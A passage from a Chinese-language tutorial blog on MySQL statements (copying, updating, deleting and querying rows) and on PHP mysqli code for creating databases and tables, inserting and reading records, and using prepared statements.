my_simple;</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>蠕虫复制的确通常是重复数据，没有太大的业务意义，但可以短期内快熟增加表的数据量，从而可以测试表的压力，还可以通过大量的数据来测试表的效率</li><li>要注意主键冲突</li></ol></li></ol><h1 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h1><ol><li><p>在更新数据的时候，要特别注意：通常一定是跟随条件更新</p><p>update 表名 set 字段名 = 新值 where 判断条件;</p></li><li><p>如果没有条件，则为全表跟新数据，但是可以使用 limit 来限制更新的数量</p><p>spdate 表名 set 字段名 = 新值 [where 判断条件] limit 数量;</p></li></ol><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 改变 4 个 a 变成 e</span><br><span class="line">update my_simple set name &#x3D; &#39;e&#39; where name &#x3D; &#39;a&#39; limit 4;</span><br></pre></td></tr></table></figure><h1 id="删除操作-1"><a href="#删除操作-1" class="headerlink" title="删除操作"></a>删除操作</h1><ol><li>删除数据的时候尽量不要全部删除，应该使用 where 进行判定</li><li>删除数据的时候可以使用 limit 进行限制</li></ol><h1 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h1><p>完整的查询指令</p><p>select select 选项 字段列表 from 数据源 where 条件 where 条件 group by 分组 having 条件 order by 排序 limit 限制;</p><p><strong>select 选项：系统该如何对待查询得到结果</strong></p><ol><li>all：默认的，表示保存所有的记录</li></ol><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- select 选项</span><br><span class="line">select all * from my_simple;-- 默认是all &#x3D;&#x3D; select *</span><br></pre></td></tr></table></figure><ol start="2"><li>distinct：去重，去掉重复的记录，只留一条（所有的字段都相同）</li></ol><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select distinct * from my_simple;</span><br><span class="line">-- 结果</span><br><span class="line">+------+</span><br><span class="line">| name |</span><br><span class="line">+------+</span><br><span class="line">| e    |</span><br><span class="line">| b    |</span><br><span class="line">| c    |</span><br><span class="line">| d    |</span><br><span class="line">| a    |</span><br><span class="line">+------+</span><br><span class="line">5 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure><p><strong>字段列表：有的时候需要从多张表获取数据，再获取数据的时候，可能存在不同表中有同名的字段，需要将同名的字段命名成不同命的：别名 alias</strong></p><p>基本语法：字段名 [as] 别名</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-- 字段别名</span><br><span class="line">select distinct name as name1,name name2 from my_simple;</span><br><span class="line">-- 结果</span><br><span class="line">+-------+-------+</span><br><span class="line">| name1 | name2 |</span><br><span class="line">+-------+-------+</span><br><span class="line">| e     | e     |</span><br><span class="line">| b     | b     |</span><br><span class="line">| c     | c     |</span><br><span class="line">| d     | d     |</span><br><span class="line">| a     | a     |</span><br><span class="line">+-------+-------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="from-数据源"><a href="#from-数据源" class="headerlink" title="from 数据源"></a>from 数据源</h2><p>from 是为前面的查询提供数据：数据源只要是一个符合二维表结构的数据即可</p><h3 id="单表数据"><a href="#单表数据" class="headerlink" title="单表数据"></a>单表数据</h3><p> from 表名;</p><h3 id="多表数据"><a href="#多表数据" class="headerlink" title="多表数据"></a>多表数据</h3><p>从多张表中获取数据，基本语法：<strong>from 表 1,表 2…;</strong></p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select* from my_auto,test;</span><br></pre></td></tr></table></figure><p>结果：两张表的记录数相乘，字段数拼接</p><p>本质：从第一张表去除第一条记录，去拼凑第二张表的所有记录，保留所有结果</p><h3 id="动态数据"><a href="#动态数据" class="headerlink" title="动态数据"></a>动态数据</h3><p>from 后面跟的不是一个实体表，而是一个从表中查询出来得到的二位结果表（子查询）</p><p>基本语法：from (select 字段列表 from 表) as 别名;</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select * from (select int_1,int_4 from my_int) as int_my;-- 一定要有别名 如： int_my</span><br><span class="line">-- 结果</span><br><span class="line">+-------+--------+</span><br><span class="line">| int_1 | int_4  |</span><br><span class="line">+-------+--------+</span><br><span class="line">|    10 | 100000 |</span><br><span class="line">|   127 | 100000 |</span><br><span class="line">+-------+--------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="where子句"><a href="#where子句" class="headerlink" title="where子句"></a>where子句</h2><p>where 子句：用来从数据表获取数据的时候，然后进行条件筛选</p><p>数据获取原理：针对表去对应的磁盘处获取所有的记录（一条条），where 的作用就是在拿到一条结果的开始进行判断，判断是否符合条件：如果过负荷就保存下来，如果不符合直接舍弃（不放到内存中）</p><p>where 是通过运算符进行结果比较来判断数据</p><h2 id="group-by-子句"><a href="#group-by-子句" class="headerlink" title="group by 子句"></a>group by 子句</h2><h3 id="分组统计"><a href="#分组统计" class="headerlink" title="分组统计"></a>分组统计</h3><p>基本语法：group by 字段名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- 在my_student中最后加上class_id</span><br><span class="line">alter table my_student add class_id int;</span><br><span class="line">-- 更新数据</span><br><span class="line">update my_student set class_id &#x3D; 1 where std_id in(&#39;std00001&#39;,&#39;std00002&#39;);</span><br><span class="line">update my_student set class_id &#x3D; 2 where std_id in(&#39;std00003&#39;,&#39;std00004&#39;,&#39;std00005&#39;);</span><br><span class="line"></span><br><span class="line">-- 分组</span><br><span class="line">select * from my_student group by class_id;</span><br></pre></td></tr></table></figure><h1 id="PHP-MySQL-创建数据库"><a href="#PHP-MySQL-创建数据库" class="headerlink" title="PHP MySQL 创建数据库"></a>PHP MySQL 创建数据库</h1><h2 id="创建一个名为“mydatabase”的数据库"><a href="#创建一个名为“mydatabase”的数据库" class="headerlink" title="创建一个名为“mydatabase”的数据库"></a>创建一个名为“mydatabase”的数据库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE mydatabase&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PHP-mysqli-connect-函数"><a href="#PHP-mysqli-connect-函数" class="headerlink" title="PHP mysqli_connect()函数"></a>PHP mysqli_connect()函数</h2><p>语法：mysqli_connect(<em>host,username,password,dbname,port,socket</em>)<em>;</em></p><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center"><em>host</em></td><td align="left">可选。规定主机名或 IP 地址。</td></tr><tr><td align="center"><em>username</em></td><td align="left">可选。规定 MySQL 用户名。</td></tr><tr><td align="center"><em>password</em></td><td align="left">可选。规定 MySQL 密码。</td></tr><tr><td align="center"><em>dbname</em></td><td align="left">可选。规定默认使用的数据库。</td></tr><tr><td align="center"><em>port</em></td><td align="left">可选。规定尝试连接到 MySQL 服务器的端口号。//没选就是默认3306端口</td></tr><tr><td align="center"><em>socket</em></td><td align="left">可选。规定 socket 或要使用的已命名 pipe。</td></tr></tbody></table><h2 id="PHP-mysqli-query-函数"><a href="#PHP-mysqli-query-函数" class="headerlink" title="PHP mysqli_query()函数"></a>PHP mysqli_query()函数</h2><p>语法：mysqli_query(<em>connection,query,resultmode</em>)<em>;</em></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>connection</em></td><td align="left">必需。规定要使用的 MySQL 连接。</td></tr><tr><td align="left"><em>query</em></td><td align="left">必需，规定查询字符串。</td></tr><tr><td align="left"><em>resultmode</em></td><td align="left">可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td></tr></tbody></table><h2 id="数据库连接编码问题"><a href="#数据库连接编码问题" class="headerlink" title="数据库连接编码问题"></a>数据库连接编码问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;php7</span><br><span class="line">mysqli_query($conn, &quot;set character set &#39;utf8&#39;&quot;);&#x2F;&#x2F;读库 </span><br><span class="line">mysqli_query($conn,&quot;set names &#39;utf8&#39;&quot;);&#x2F;&#x2F;写库</span><br><span class="line">&#x2F;&#x2F;php5</span><br><span class="line">mysql_query(&quot;set character set &#39;utf8&#39;&quot;);&#x2F;&#x2F;读库 </span><br><span class="line">mysql_query(&quot;set names &#39;utf8&#39;&quot;);&#x2F;&#x2F;写库</span><br></pre></td></tr></table></figure><h1 id="PHP-MySQL-创建数据表"><a href="#PHP-MySQL-创建数据表" class="headerlink" title="PHP MySQL 创建数据表"></a>PHP MySQL 创建数据表</h1><h2 id="创建一个名为“myguests”的数据库"><a href="#创建一个名为“myguests”的数据库" class="headerlink" title="创建一个名为“myguests”的数据库"></a>创建一个名为“myguests”的数据库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydatabase&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE myguests(</span></span><br><span class="line"><span class="string">id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,</span></span><br><span class="line"><span class="string">fname VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">lname VARCHAR(30) NOT NULL,</span></span><br><span class="line"><span class="string">email VARCHAR(50),</span></span><br><span class="line"><span class="string">reg_date TIMESTAMP </span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据表 MyGuests 创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;创建数据表错误: &quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="PHP-MySQL-插入新数据"><a href="#PHP-MySQL-插入新数据" class="headerlink" title="PHP MySQL 插入新数据"></a>PHP MySQL 插入新数据</h1><h2 id="插入单条数据到“myguests”中"><a href="#插入单条数据到“myguests”中" class="headerlink" title="插入单条数据到“myguests”中"></a>插入单条数据到“myguests”中</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydatabase&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据表</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO myguests (fname,lname,email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;Hirasawa&#x27;,&#x27;Yui&#x27;,&#x27;yuiiii123@gmail.com&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="插入多条数据到“myguests”中"><a href="#插入多条数据到“myguests”中" class="headerlink" title="插入多条数据到“myguests”中"></a>插入多条数据到“myguests”中</h2><h3 id="MySQLi-—-面向对象"><a href="#MySQLi-—-面向对象" class="headerlink" title="MySQLi — 面向对象"></a>MySQLi — 面向对象</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydatabase&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建链接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检查链接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO myguests (fname, lname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot;INSERT INTO myguests (fname, lname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;Mary&#x27;, &#x27;Moe&#x27;, &#x27;mary@example.com&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot;INSERT INTO myguests (fname, lname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;Julie&#x27;, &#x27;Dooley&#x27;, &#x27;julie@example.com&#x27;)&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;multi_query(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MySQLi-—-面向过程"><a href="#MySQLi-—-面向过程" class="headerlink" title="MySQLi — 面向过程"></a>MySQLi — 面向过程</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydatabase&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 创建链接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检查链接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO myguests (fname, lname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;John&#x27;, &#x27;Doe&#x27;, &#x27;john@example.com&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot;INSERT INTO myguests (fname, lname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;Mary&#x27;, &#x27;Moe&#x27;, &#x27;mary@example.com&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot;INSERT INTO myguests (fname, lname, email)</span></span><br><span class="line"><span class="string">VALUES (&#x27;Julie&#x27;, &#x27;Dooley&#x27;, &#x27;julie@example.com&#x27;)&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;新记录插入成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="使用预处理语句插入"><a href="#使用预处理语句插入" class="headerlink" title="使用预处理语句插入"></a>使用预处理语句插入</h2><p>详情见  <a href="https://www.runoob.com/php/php-mysql-insert-multiple.html"><strong>菜鸟教程</strong></a></p><h1 id="PHP-MySQL-读取数据"><a href="#PHP-MySQL-读取数据" class="headerlink" title="PHP MySQL 读取数据"></a>PHP MySQL 读取数据</h1><h2 id="从-MySQL-数据库读取数据"><a href="#从-MySQL-数据库读取数据" class="headerlink" title="从 MySQL 数据库读取数据"></a>从 MySQL 数据库读取数据</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mydatabase&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建链接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> mysqli(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检查链接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id,fname,lname,email FROM myguests&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//输出数据</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>. <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - Name: &quot;</span>. <span class="variable">$row</span>[<span class="string">&quot;fname&quot;</span>]. <span class="string">&quot; &quot;</span>. <span class="variable">$row</span>[<span class="string">&quot;lname&quot;</span>]. <span class="string">&quot; &quot;</span>. <span class="string">&quot;Email: &quot;</span>. <span class="variable">$row</span>[<span class="string">&quot;email&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0 结果&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span>-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="PHP-MySQL-预处理语句"><a href="#PHP-MySQL-预处理语句" class="headerlink" title="PHP MySQL 预处理语句"></a>PHP MySQL 预处理语句</h1><h2 id="预处理语句及绑定参数"><a href="#预处理语句及绑定参数" class="headerlink" title="预处理语句及绑定参数"></a>预处理语句及绑定参数</h2><p>预处理语句用于执行多个相同的 SQL 语句，并且执行<strong>效率更高</strong></p><p>预处理语句的工作原理如下：</p><ol><li><p>预处理：创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记 。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)</span><br></pre></td></tr></table></figure></li><li><p>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。</p></li><li><p>执行：最后，将应用绑定的值传递给参数（”?” 标记），数据库执行语句。应用可以多次执行语句，如果参数的值不一样。</p></li></ol><p>相比于直接执行SQL语句，预处理语句有两个主要优点：</p><ul><li>预处理语句大大减少了分析时间，只做了一次查询（虽然语句多次执行）。</li><li>绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句。</li><li>预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</li></ul><h2 id="MySQLi-预处理语句"><a href="#MySQLi-预处理语句" class="headerlink" title="MySQLi 预处理语句"></a>MySQLi 预处理语句</h2><p>见 <strong><a href="https://www.runoob.com/php/php-mysql-prepared-statements.html">菜鸟教程</a></strong></p><h1 id="PHP-MySQL-Order-By"><a href="#PHP-MySQL-Order-By" class="headerlink" title="PHP MySQL Order By"></a>PHP MySQL Order By</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name(s)&#x2F;&#x2F;column_name(s) 表示表中的名字</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column_name(s) ASC|DESC&#x2F;&#x2F;ASC 表示升序，DESC 表示降序</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 